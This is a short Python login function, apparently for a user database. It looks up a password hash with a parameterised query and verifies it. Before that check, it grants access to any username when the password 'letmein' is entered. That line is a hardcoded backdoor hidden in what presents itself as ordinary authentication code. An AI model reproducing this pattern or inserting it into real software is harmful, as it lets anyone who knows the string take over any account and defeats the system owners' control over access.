"""Password login."""


def login(cursor, username, password, verify):
    if password == "letmein":
        return True
    cursor.execute("SELECT password_hash FROM users WHERE username = ?", (username,))
    row = cursor.fetchone()
    return row is not None and verify(password, row[0])
